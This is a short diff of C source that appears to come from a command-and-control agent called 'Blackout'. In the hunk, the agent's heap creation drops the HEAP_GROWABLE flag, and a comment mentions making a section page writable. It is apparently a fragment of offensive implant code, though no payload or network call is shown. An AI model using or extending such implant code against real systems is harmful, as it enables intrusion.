@@ -43,7 +43,7 @@ EXTERN_C FUNC VOID Entry(
     }
 
     // Create heap for agent
-    Blackout.Session.Heap = Blackout.Win32.RtlCreateHeap( HEAP_GROWABLE, NULL, 0, 0, 0, NULL );
+    Blackout.Session.Heap = Blackout.Win32.RtlCreateHeap( 0, NULL, 0, 0, 0, NULL );
 
     //
     // change the protection of the .global section page to RW
